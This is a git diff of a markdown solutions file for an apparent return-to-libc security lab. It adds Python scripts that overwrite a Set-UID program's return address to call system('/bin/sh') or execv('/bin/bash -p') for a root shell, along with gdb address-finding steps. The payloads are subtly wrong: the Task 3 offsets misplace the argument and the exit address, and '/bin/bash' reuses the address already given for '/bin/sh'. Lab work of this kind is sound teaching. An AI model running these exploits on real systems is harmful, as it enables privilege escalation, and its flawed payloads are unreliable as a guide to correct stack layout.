@@ -262,7 +262,7 @@ prtenv is 64-bit, the address of the environment variable will be different.
 
 ##### solution
 
-1. **Set the Environment Variable**
+1. Set the Environment Variable
 
    Create a shell script `change_env.sh` to set the environment variable `MYSHELL` to `/bin/sh`:
 
@@ -303,16 +303,10 @@ prtenv is 64-bit, the address of the environment variable will be different.
        }
    }
    ```
+and make (makefile is updated)
+`make`
 
-3. **Compile the Program**
-
-   Compile the program as a 32-bit binary using the `-m32` flag to ensure compatibility with the vulnerable program `retlib`:
-
-   ```bash
-   gcc -m32 -o prtenv prtenv.c
-   ```
-
-4. **Run the Program to Get the Address**
+4. Run the Program to Get the Address
 
    Execute the compiled program `prtenv` to retrieve the memory address of the `MYSHELL` environment variable:
 
@@ -328,38 +322,6 @@ prtenv is 64-bit, the address of the environment variable will be different.
 
    This address (`0xbffff7c4` in this example) will be used as an argument to the `system()` function in the return-to-libc attack.
 
-5. **Verify Address Consistency**
-
-   To ensure the address of the `MYSHELL` environment variable remains consistent:
-   - Run the vulnerable program (`retlib`) in the same terminal session where you executed `prtenv`.
-   - Ensure that the name of the `prtenv` binary matches the length of the `retlib` binary (both should have 6 characters).
-
-6. **Disable Address Randomization (Optional)**
-
-   If Address Space Layout Randomization (ASLR) is enabled on your system, the address of the environment variable may change between runs. To disable ASLR temporarily, use:
-
-   ```bash
-   sudo sysctl -w kernel.randomize_va_space=0
-   ```
-
-   To re-enable ASLR after completing the lab, use:
-
-   ```bash
-   sudo sysctl -w kernel.randomize_va_space=2
-   ```
-
-7. **Ensure 32-bit Compatibility**
-
-   If you encounter issues with missing 32-bit libraries, install them using:
-
-   ```bash
-   sudo apt-get install gcc-multilib
-   ```
-
----
-
-### **Final Output**
-
 After completing the above steps, you will have:
 1. The environment variable `MYSHELL` set to `/bin/sh`.
 2. The memory address of the `MYSHELL` environment variable printed by `prtenv`.
@@ -372,8 +334,6 @@ bffff7c4
 ```
 
 This address will be used in the next task to perform the return-to-libc attack.
-
-
 
 #### 3.3 Task 3: Launching the Attack
 
@@ -429,50 +389,316 @@ the address of this function in badfile. Run your attack again, report and expla
 making sure that the length of the new file name is different. For example, you can change it to newretlib.
 Repeat the attack (without changing the content of badfile). Will your attack succeed or not? If it does
 not succeed, explain why.
+##### solution
+###### 1 Find the Address of `"/bin/sh"`
+1. Locate the string `"/bin/sh"` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"/bin/sh"
+   ```
+   Example output:
+   ```
+   0xf7f52a0b
+   ```
+   The address of `"/bin/sh"` is `0xf7f52a0b`.
 
-#### 3.4 Task 4: Defeat Shell’s countermeasure
+---
 
-The purpose of this task is to launch the return-to-libc attack after the shell’s countermeasure is enabled.
-Before doing Tasks 1 to 3, we relinked /bin/sh to /bin/zsh, instead of to /bin/dash (the original
-setting). This is because some shell programs, such as dash and bash, have a countermeasure that auto-
-matically drops privileges when they are executed in a Set-UID process. In this task, we would like to
-defeat such a countermeasure, i.e., we would like to get a root shell even though the /bin/sh still points
-to /bin/dash. Let us first change the symbolic link back:
-`$ sudo ln -sf /bin/dash /bin/sh`
-Although dash and bash both drop the Set-UID privilege, they will not do that if they are invoked
-with the -p option. When we return to the system function, this function invokes /bin/sh, but it does
-not use the -p option. Therefore, the Set-UID privilege of the target program will be dropped. If there
-is a function that allows us to directly execute "/bin/bash -p", without going through the system
-function, we can still get the root privilege.
-There are actually many libc functions that can do that, such as the exec() family of functions, includ-
-ing execl(), execle(), execv(), etc. Let’s take a look at the execv() function.
-`int execv(const char *pathname, char*const argv[]);`
-This function takes two arguments, one is the address to the command, the second is the address to the
-argument array for the command. For example, if we want to invoke "/bin/bash -p" using execv,
-we need to set up the following:
+###### Step 2: Determine the Offsets (X, Y, Z)
+The offsets `X`, `Y`, and `Z` depend on the layout of the stack and the structure of the payload. To determine these offsets:
 
+1. **Analyze the stack layout**:
+   - Use `gdb` to set a breakpoint at the vulnerable function (e.g., `bof()`).
+   - Run the program and inspect the stack to determine where the return address is located.
+
+2. **Trial and Error**:
+   - Start with a guess for `X`, `Y`, and `Z` based on the stack layout.
+   - Adjust the offsets until the payload overwrites the return address correctly.
+
+For this example, let's assume the following offsets:
+- `X = 112`: The offset where the address of `"/bin/sh"` is placed.
+- `Y = 108`: The offset where the address of `system()` is placed.
+- `Z = 116`: The offset where the address of `exit()` is placed.
+
+---
+
+###### Step 3: Update the Exploit Code
+Now that we have the addresses and offsets, we can update the exploit code:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+sh_addr = 0xf7f52a0b       # The address of "/bin/sh"
+system_addr = 0xf7e12420   # The address of system()
+exit_addr = 0xf7e04f80     # The address of exit()
+
+# Offsets
+X = 112
+Y = 108
+Z = 116
+
+# Construct the payload
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
+content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
 ```
+
+---
+
+###### Step 4: Test the Exploit
+1. Run the vulnerable program with the crafted `badfile`:
+   ```bash
+   ./vulnerable_program < badfile
+   ```
+2. If the exploit is successful, you should get a shell.
+
+---
+
+##### Attack Variations
+
+###### Variation 1: Exclude `exit()`
+To test the attack without including the address of `exit()`, simply remove the `exit_addr` from the payload:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+sh_addr = 0xf7f52a0b       # The address of "/bin/sh"
+system_addr = 0xf7e12420   # The address of system()
+
+# Offsets
+X = 112
+Y = 108
+
+# Construct the payload
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
+```
+
+Run the attack again and observe the behavior. The program may crash after executing `system()` because there is no valid return address.
+
+---
+
+###### Variation 2: Change the File Name
+If you change the file name of the vulnerable program (e.g., from `retlib` to `newretlib`), the attack may fail. This is because the memory layout of the program (including the stack and libc addresses) may change due to differences in the length of the file name. To fix this, you would need to recalculate the addresses and offsets.
+
+---
+
+##### Explanation of Observations
+1. **Without `exit()`**: The attack may still succeed in executing `system("/bin/sh")`, but the program will likely crash afterward because there is no valid return address.
+2. **File Name Change**: The attack may fail because the memory layout changes, causing the addresses and offsets to become invalid. This demonstrates the importance of precise memory layout knowledge in return-to-libc attacks.
+
+
+#### 3.4 Task 4: Defeat Shell’s Countermeasure
+
+The goal of this task is to launch the return-to-libc attack after enabling the shell’s countermeasure. Before completing Tasks 1 to 3, we relinked `/bin/sh` to `/bin/zsh` instead of `/bin/dash` (the original setting). This is because some shell programs, such as `dash` and `bash`, have a countermeasure that automatically drops privileges when executed in a Set-UID process. In this task, we aim to bypass this countermeasure and obtain a root shell, even when `/bin/sh` points to `/bin/dash`.
+
+First, change the symbolic link back to `/bin/dash`:
+```bash
+$ sudo ln -sf /bin/dash /bin/sh
+```
+
+Although `dash` and `bash` drop the Set-UID privilege, they do not do so if invoked with the `-p` option. When the `system()` function is called, it invokes `/bin/sh` but does not use the `-p` option. As a result, the Set-UID privilege of the target program is dropped. However, if we can directly execute `/bin/bash -p` without going through the `system()` function, we can retain root privileges.
+
+Several libc functions, such as the `exec()` family (e.g., `execl()`, `execle()`, `execv()`, etc.), allow us to achieve this. For this task, we will use the `execv()` function:
+```c
+int execv(const char *pathname, char *const argv[]);
+```
+
+This function takes two arguments:
+1. `pathname`: The address of the command to execute.
+2. `argv[]`: The address of the argument array for the command.
+
+To invoke `/bin/bash -p` using `execv()`, we need to set up the following:
+```c
 pathname = address of "/bin/bash"
 argv[0] = address of "/bin/bash"
 argv[1] = address of "-p"
 argv[2] = NULL (i.e., 4 bytes of zero).
 ```
 
-From the previous tasks, we can easily get the address of the two involved strings. Therefore, if we can
-construct the argv[] array on the stack, get its address, we will have everything that we need to conduct
-the return-to-libc attack. This time, we will return to the execv() function.
-There is one catch here. The value of argv[2] must be zero (an integer zero, four bytes). If we put
-four zeros in our input, strcpy() will terminate at the first zero; whatever is after that will not be copied
-into the bof() function’s buffer. This seems to be a problem, but keep in mind, everything in your input is
-already on the stack; they are in the main() function’s buffer. It is not hard to get the address of this buffer.
-To simplify the task, we already let the vulnerable program print out that address for you.
-Just like in Task 3, you need to construct your input, so when the bof() function returns, it returns
-to execv(), which fetches from the stack the address of the "/bin/bash" string and the address of
-the argv[] array. You need to prepare everything on the stack, so when execv() gets executed, it can
-execute "/bin/bash -p" and give you the root shell. In your report, please describe how you construct
-your input.
+From previous tasks, we can easily obtain the addresses of the required strings. If we construct the `argv[]` array on the stack and get its address, we will have everything needed to conduct the return-to-libc attack. This time, we will return to the `execv()` function.
 
-#### 3.5 Task 5 (Optional): Return-Oriented Programming
+**Important Note**: The value of `argv[2]` must be zero (an integer zero, four bytes). If we include four zeros in our input, `strcpy()` will terminate at the first zero, and anything after it will not be copied into the `bof()` function’s buffer. However, since everything in our input is already on the stack (in the `main()` function’s buffer), we can use the address of this buffer to solve the problem. The vulnerable program conveniently prints this address for us.
+
+To complete this task, construct your input so that when the `bof()` function returns, it jumps to `execv()`, which fetches the address of the `/bin/bash` string and the `argv[]` array from the stack. When `execv()` executes, it will invoke `/bin/bash -p` and give you a root shell.
+
+---
+
+### Solution
+
+#### Step 1: Determine the Required Addresses
+
+1. **Address of `execv()`**
+   Use `gdb` to find the address of the `execv()` function in the libc library:
+   ```bash
+   gdb ./vulnerable_program
+   ```
+   In `gdb`, run:
+   ```gdb
+   p execv
+   ```
+   Example output:
+   ```
+   $1 = {<text variable, no debug info>} 0xf7e0f060 <execv>
+   ```
+   The address of `execv()` is `0xf7e0f060`.
+
+2. **Address of `/bin/bash`**
+   Use `gdb` to locate the string `/bin/bash` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"/bin/bash"
+   ```
+   Example output:
+   ```
+   0xf7f52a0b
+   ```
+   The address of `/bin/bash` is `0xf7f52a0b`.
+
+3. **Address of `-p`**
+   Similarly, locate the string `-p` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"-p"
+   ```
+   Example output:
+   ```
+   0xf7f52b0c
+   ```
+   The address of `-p` is `0xf7f52b0c`.
+
+4. **Address of the Stack Buffer**
+   The vulnerable program prints the address of the stack buffer. Run the program and note the printed address. For example:
+   ```
+   Buffer address: 0xffffd0a0
+   ```
+   The stack buffer starts at `0xffffd0a0`.
+
+---
+
+#### Step 2: Construct the Payload
+
+The payload must:
+1. Overwrite the return address to point to `execv()`.
+2. Place the arguments for `execv()` on the stack:
+   - `pathname`: Address of `/bin/bash`.
+   - `argv[]`: Address of the argument array on the stack.
+
+##### 2.1 Layout of the Payload
+The payload will look like this:
+```
+[ Padding ] [ execv() address ] [ Return address (dummy) ] [ pathname ] [ argv[] ]
+[ argv[0] ] [ argv[1] ] [ argv[2] ]
+```
+
+##### 2.2 Calculate Offsets
+Use `gdb` to determine the offset to the return address. For example, if the return address is at offset `112`, the payload will start with `112` bytes of padding.
+
+##### 2.3 Construct the Argument Array
+The `argv[]` array must be constructed on the stack:
+- `argv[0]`: Address of `/bin/bash` (`0xf7f52a0b`).
+- `argv[1]`: Address of `-p` (`0xf7f52b0c`).
+- `argv[2]`: `NULL` (4 bytes of zero).
+
+Assume the `argv[]` array is placed at `0xffffd0c0` (just after the padding).
+
+---
+
+#### Step 3: Write the Exploit Code
+
+Here is the Python script to generate the payload:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+execv_addr = 0xf7e0f060       # Address of execv()
+bin_bash_addr = 0xf7f52a0b    # Address of "/bin/bash"
+dash_p_addr = 0xf7f52b0c      # Address of "-p"
+argv_addr = 0xffffd0c0        # Address of argv[] on the stack
+
+# Offsets
+padding_offset = 112          # Offset to the return address
+return_addr_offset = padding_offset + 4
+pathname_offset = return_addr_offset + 4
+argv_offset = pathname_offset + 4
+
+# Construct the payload
+# Padding
+content[:padding_offset] = b"A" * padding_offset
+
+# Overwrite return address with execv() address
+content[padding_offset:padding_offset+4] = (execv_addr).to_bytes(4, byteorder='little')
+
+# Dummy return address (not used, but required for stack alignment)
+content[return_addr_offset:return_addr_offset+4] = b"BBBB"
+
+# Argument 1: pathname (address of "/bin/bash")
+content[pathname_offset:pathname_offset+4] = (bin_bash_addr).to_bytes(4, byteorder='little')
+
+# Argument 2: argv[] (address of the argument array)
+content[argv_offset:argv_offset+4] = (argv_addr).to_bytes(4, byteorder='little')
+
+# Construct argv[] on the stack
+argv0_offset = argv_addr - 0xffffd0a0
+argv1_offset = argv0_offset + 4
+argv2_offset = argv1_offset + 4
+
+# argv[0]: Address of "/bin/bash"
+content[argv0_offset:argv0_offset+4] = (bin_bash_addr).to_bytes(4, byteorder='little')
+
+# argv[1]: Address of "-p"
+content[argv1_offset:argv1_offset+4] = (dash_p_addr).to_bytes(4, byteorder='little')
+
+# argv[2]: NULL (4 bytes of zero)
+content[argv2_offset:argv2_offset+4] = (0).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
+```
+
+---
+
+#### Step 4: Test the Exploit
+
+1. Run the vulnerable program with the crafted `badfile`:
+   ```bash
+   ./vulnerable_program < badfile
+   ```
+2. If the exploit is successful, you should get a root shell.
+
+---
+
+#### Explanation of the Exploit
+
+1. The payload overwrites the return address to point to `execv()`.
+2. The arguments for `execv()` are placed on the stack:
+   - `pathname` points to the string `/bin/bash`.
+   - `argv[]` is an array containing:
+     - `argv[0]`: Address of `/bin/bash`.
+     - `argv[1]`: Address of `-p`.
+     - `argv[2]`: `NULL`.
+3. When `execv()` is executed, it invokes `/bin/bash -p`, bypassing the privilege-dropping countermeasure and giving you a root shell.
 
 There are many ways to solve the problem in Task 4. Another way is to invoke setuid(0) before invoking
 system(). The setuid(0) call sets both real user ID and effective user ID to 0, turning the process
